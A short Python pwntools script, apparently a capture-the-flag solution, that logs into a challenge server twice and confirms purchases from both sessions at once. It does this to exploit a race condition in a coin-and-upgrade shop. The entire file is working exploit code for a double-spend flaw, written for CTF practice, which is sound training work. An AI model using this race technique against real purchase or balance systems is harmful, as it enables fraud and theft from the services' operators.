from pwn import *

HOST = "instancer.dalctf2026.com"
PORT = 34801
context.log_level = "debug"
user = b"aaaasa"
pw = b"67676767"

def login():
    r = remote(HOST, PORT)
    r.recvuntil(b"Username: ")
    r.sendline(user)
    data = r.recvuntil(b"Password: ")
    r.sendline(pw)
    return r

r = login()

# mine 10 bits to buy upgrade
for _ in range(10):
    r.recvuntil(b"Option: ")
    r.sendline(b"1")

r2 = login()

for x in (r, r2):
    x.recvuntil(b"Option: ")
    x.sendline(b"2")
    x.recvuntil(b"Option: ")
    x.sendline(b"1")
    x.recvuntil(b"Confirm purchase")

r.sendline(b"y")
r2.sendline(b"y")

r2.recvuntil(b"Option: ")
r2.sendline(b"2")
r2.recvuntil(b"Option: ")
r2.sendline(b"4")
r2.recvuntil(b"Confirm purchase")
r2.sendline(b"y")

r2.interactive()